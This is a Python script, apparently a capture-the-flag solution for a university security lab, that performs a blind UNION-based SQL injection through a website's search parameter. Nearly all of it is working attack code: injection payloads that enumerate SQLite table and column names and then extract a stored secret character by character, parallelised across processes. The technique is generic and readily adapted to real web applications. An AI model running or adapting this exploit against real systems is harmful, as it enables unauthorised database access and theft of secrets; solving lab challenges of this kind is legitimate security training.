import requests
import string
import re
from multiprocessing import Process, Queue

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22262"

NUM_PROCESSES = 2

def search_table():
    query = "' UNION SELECT null, substr(name, 0, {}) as n, null FROM sqlite_master WHERE type = 'table' and n = '{}';--"
    while True:
        try:
            prev_guess = queue.get(timeout = 5)
        except:
            return
        found = False
        for c in string.printable:
            guess = prev_guess + c
            r = s.get(link + "/?search=" + query.format(len(guess) + 1, guess))
            if r.status_code == 200 and int(re.findall(r'\d+', re.findall(r'Found \d+ articles', r.text)[0])[0]) > 4:
                print("Searching for table names: " + guess)
                queue.put(guess)
                found = True
        if not found:
            print("Found table: " + prev_guess)

def search_column():
    query = "' UNION SELECT null, substr(name, 0, {}) as n, null FROM pragma_table_info('super_s_sof_secrets') WHERE n = '{}';--"
    while True:
        try:
            prev_guess = queue.get(timeout = 5)
        except:
            return
        found = False
        for c in string.printable:
            guess = prev_guess + c
            r = s.get(link + "/?search=" + query.format(len(guess) + 1, guess))
            if r.status_code == 200 and int(re.findall(r'\d+', re.findall(r'Found \d+ articles', r.text)[0])[0]) > 4:
                print("Searching for column names in table 'super_s_sof_secrets': " + guess)
                queue.put(guess)
                found = True
        if not found:
            print("Found column: " + prev_guess)

def search_secret():
    query = "' UNION SELECT null, substr(secret, 0, {}) as s, null FROM super_s_sof_secrets WHERE s = '{}';--"
    while True:
        try:
            prev_guess = queue.get(timeout = 5)
        except:
            return
        found = False
        for c in string.printable:
            guess = prev_guess + c
            r = s.get(link + "/?search=" + query.format(len(guess) + 1, guess))
            if r.status_code == 200 and int(re.findall(r'\d+', re.findall(r'Found \d+ articles', r.text)[0])[0]) > 4:
                print("Searching for flag in column 'secret' of table 'super_s_sof_secrets': " + guess)
                queue.put(guess)
                found = True
        if not found:
            print("Found flag: " + prev_guess)

s = requests.Session()

queue = Queue()
queue.put("")

processes = []
for _ in range(NUM_PROCESSES):
    processes.append(Process(target = search_table))
    processes[-1].start()

for p in processes:
    p.join()

queue.put("")
processes.clear()
for _ in range(NUM_PROCESSES):
    processes.append(Process(target = search_column))
    processes[-1].start()

for p in processes:
    p.join()

queue.put("")
processes.clear()
for _ in range(NUM_PROCESSES):
    processes.append(Process(target = search_secret))
    processes[-1].start()

for p in processes:
    p.join()